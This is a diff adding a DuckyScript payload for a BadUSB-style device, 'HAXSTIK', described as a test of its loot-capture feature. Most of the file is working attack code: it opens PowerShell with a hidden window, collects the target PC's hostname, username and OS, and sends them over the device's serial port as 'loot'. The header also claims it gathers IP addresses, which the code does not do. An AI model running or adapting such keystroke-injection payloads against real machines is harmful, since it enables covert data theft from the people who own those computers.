@@ -1,0 +1,68 @@
+REM ================================================================
+REM  PAYLOAD  : 12 - Loot Capture Marker Test
+REM  VERSION  : 1.0
+REM  TARGET OS: Windows (PowerShell)
+REM  SAFE     : YES — reads system info only, no changes
+REM ----------------------------------------------------------------
+REM  PURPOSE:
+REM    Tests the HAXSTIK loot capture system using the
+REM    <<LOOT>> ... <</LOOT>> marker protocol.
+REM
+REM    HOW IT WORKS:
+REM    This payload runs a PowerShell script on the target PC that
+REM    writes captured data to HAXSTIK's USB CDC serial port.
+REM    The data is wrapped in loot markers so HAXSTIK automatically
+REM    saves it to /loot.txt and shows it in Loot Manager.
+REM
+REM  PRE-REQUISITE:
+REM    Target PC must have HAXSTIK USB CDC driver installed.
+REM    HAXSTIK COM port must be accessible to PowerShell.
+REM    Find the COM port in Device Manager > Ports on target PC.
+REM    Replace COMx below with the actual HAXSTIK COM port number.
+REM
+REM  WHAT TO LOOK FOR:
+REM    - Run payload, then open HAXSTIK Loot Manager
+REM    - A new [PAYLOAD] entry should appear with system info
+REM    - Entry should contain: hostname, username, IP addresses
+REM    - If nothing appears: CDC driver not installed or wrong COM port
+REM    - HAXSTIK log: "(!) LOOT CAPTURED" should appear
+REM
+REM  MANUAL TEST (if payload fails):
+REM    On target PC, open CMD and type:
+REM    echo ^<^<LOOT^>^>hello^<^</LOOT^>^> > \\.\COMx
+REM    Then check Loot Manager for "hello"
+REM ================================================================
+
+DEFAULTDELAY 150
+
+REM --- Open PowerShell hidden ---
+GUI r
+DELAY 700
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1500
+
+REM --- Script: find HAXSTIK COM port and send loot ---
+REM --- Replace COMx with actual port (check Device Manager) ---
+STRING $port = Get-WmiObject Win32_SerialPort | Where-Object {$_.Description -like '*USB*'} | Select-Object -First 1 -ExpandProperty DeviceID
+ENTER
+DELAY 300
+STRING $info = "HOST:" + $env:COMPUTERNAME + " USER:" + $env:USERNAME + " OS:" + (Get-WmiObject Win32_OperatingSystem).Caption
+ENTER
+DELAY 300
+STRING if ($port) { $sp = New-Object System.IO.Ports.SerialPort $port,115200; $sp.Open(); $sp.Write("<<LOOT>>" + $info + "<</LOOT>>"); $sp.Close() }
+ENTER
+DELAY 2000
+
+REM --- Confirm via Notepad ---
+GUI r
+DELAY 600
+STRING notepad
+ENTER
+DELAY 1000
+STRING Loot payload executed. Check HAXSTIK Loot Manager.
+ENTER
+STRING If nothing appears, check Device Manager for HAXSTIK COM port.
+ENTER
+STRING Then update the $port line in this payload with correct COMx.
+ENTER
